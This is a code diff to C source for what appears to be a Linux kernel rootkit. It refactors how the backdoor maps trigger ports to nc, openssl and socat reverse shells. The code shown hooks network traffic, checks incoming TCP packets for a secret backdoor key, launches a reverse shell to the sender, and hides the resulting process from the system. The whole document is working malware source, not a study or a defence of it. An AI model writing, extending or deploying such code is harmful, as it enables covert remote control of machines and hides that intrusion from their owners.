@@ -34,15 +34,26 @@ uint64_t auto_bdkey = 0x0000000000000000;
 
 #define BD_PATH_NUM 3
 #define BD_OPS_SIZE 2
+
 enum {
-	PORT_NULL,
+	PORT_UNSET = 0,
 	PORT_NC = 80,
 	PORT_OPENSSL = 443,
 	PORT_SOCAT = 444,
 	PORT_SOCAT_TTY = 445
 };
-static int allowed_ports[] = { PORT_NC, PORT_OPENSSL, PORT_SOCAT, PORT_SOCAT_TTY,
-			       PORT_NULL };
+
+struct allowed_ports_t {
+	int port;
+	int default_child_count;
+};
+static struct allowed_ports_t allowed_ports[] = {
+	{ PORT_NC, 1 },
+	{ PORT_SOCAT, 1 },
+	{ PORT_SOCAT_TTY, 1 },
+	{ PORT_OPENSSL, 2 },
+	{ PORT_UNSET, PORT_UNSET }
+};
 
 struct stat_ops_t {
 	int kv_port;
@@ -54,24 +65,17 @@ static struct stat_ops_t stat_ops[] = {
 	  { "/usr/bin/openssl", "/bin/openssl", "/var/.openssl" } },
 	{ .kv_port = PORT_SOCAT,
 	  { "/bin/socat", "/var/.socat", "/usr/bin/socat" } },
-	{ .kv_port = PORT_NULL }
+	{ .kv_port = PORT_UNSET }
 };
 
-static int _predict_child_count(int port)
+static int _estimated_child_count(int port)
 {
-#ifdef DEBUG_RING_BUFFER
-	switch (port) {
-	case PORT_NC:
-	case PORT_SOCAT:
-	case PORT_SOCAT_TTY:
-		return 1;
-	case PORT_OPENSSL:
-		return 2;
-	default:
-		break;
-	}
-#endif
-	return 0;
+	int i;
+	for (i = 0; allowed_ports[i].port != PORT_UNSET; ++i)
+		if (port == allowed_ports[i].port) {
+			return allowed_ports[i].default_child_count;
+		}
+	return PORT_UNSET;
 }
 
 // Iterate over stat_ops list and query FS
@@ -80,7 +84,7 @@ static int _predict_child_count(int port)
 static const char *_locate_bdbin(int port)
 {
 	int i, x;
-	for (i = 0; i < BD_OPS_SIZE && stat_ops[i].kv_port != PORT_NULL; ++i) {
+	for (i = 0; i < BD_OPS_SIZE && stat_ops[i].kv_port != PORT_UNSET; ++i) {
 		if (port != stat_ops[i].kv_port)
 			continue;
 		for (x = 0; x < BD_PATH_NUM; ++x) {
@@ -161,11 +165,11 @@ static int _retrieve_pid_cb(struct subprocess_info *info, struct cred *new)
 static inline int _check_bdports(int port)
 {
 	int i;
-	for (i = 0; allowed_ports[i] != 0; ++i)
-		if (port == allowed_ports[i]) {
+	for (i = 0; allowed_ports[i].port != PORT_UNSET; ++i)
+		if (port == allowed_ports[i].port) {
 			return port;
 		}
-	return 0;
+	return PORT_UNSET;
 }
 
 static char *_build_bd_command(const char *exe, uint16_t dst_port, __be32 saddr,
@@ -173,7 +177,7 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port, __be32 saddr,
 {
 	short i;
 	char *bd = NULL;
-	for (i = 0; allowed_ports[i] != PORT_NULL && !bd; ++i) {
+	for (i = 0; allowed_ports[i].port != PORT_UNSET && !bd; ++i) {
 		switch (dst_port) {
 		case PORT_SOCAT_TTY: {
 			// same as PORT_SOCAT but on dst port PORT_SOCAT_TTY
@@ -257,7 +261,11 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port, __be32 saddr,
 	return bd;
 }
 
-static bool _wait_for_children(struct task_struct *task, int default_child_count)
+// Busy-loop with max timeout
+// Count the number of child tasks for given process
+// Return when number is reached or when timeout expires
+static bool _wait_for_children(struct task_struct *task,
+			       int default_child_count)
 {
 	unsigned long tmout_jiffies = msecs_to_jiffies(500);
 	unsigned long start_jiffies = jiffies;
@@ -270,7 +278,6 @@ static bool _wait_for_children(struct task_struct *task, int default_child_count
 		struct task_struct *child;
 
 		rcu_read_lock();
-
 		list_for_each_entry (child, &task->children, sibling) {
 			actual_count++;
 		}
@@ -320,16 +327,14 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int port,
 	}
 
 	if (ret == 0) {
-		bool __attribute__((unused))rc = _wait_for_children(
-				get_pid_task(find_get_pid(shellpid), PIDTYPE_PID),
-				default_child_count);
+		bool __attribute__((unused)) rc = _wait_for_children(
+			get_pid_task(find_get_pid(shellpid), PIDTYPE_PID),
+			default_child_count);
 
-#ifdef DEBUG_RING_BUFFER
 		if (!rc) {
-			int estimated = _predict_child_count(port);
-			prwarn("Warning: revshell pid %d don't match expected children count of %d\n", shellpid, estimated);
+			prwarn("Warning: revshell pid %d don't match estimated child count of %d\n",
+			       shellpid, default_child_count);
 		}
-#endif
 
 		// Hide straight-away what we've got
 		kv_hide_task_by_pid(shellpid, saddr, false);
@@ -493,8 +498,10 @@ static int _bd_watchdog(void *t)
 		prinfo("Got event\n");
 		// read data set by nf_hook
 		if (_get_fifo(&kf)) {
-			int default_child_count = _predict_child_count(kf->dport);
-			_run_backdoor(kf->iph, kf->tcph, kf->dport, default_child_count);
+			int default_child_count =
+				_estimated_child_count(kf->dport);
+			_run_backdoor(kf->iph, kf->tcph, kf->dport,
+				      default_child_count);
 			kfree(kf);
 		}
 	}
@@ -573,7 +580,7 @@ static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
 		int dport = _check_bdports(htons(tcph->dest));
 
 		// Silence libpcap?
-		if (dport == PORT_NULL || !kv_check_bdkey(tcph, skb))
+		if (dport == PORT_UNSET || !kv_check_bdkey(tcph, skb))
 			goto leave;
 
 		kf = kzalloc(sizeof(struct kfifo_priv), GFP_KERNEL);
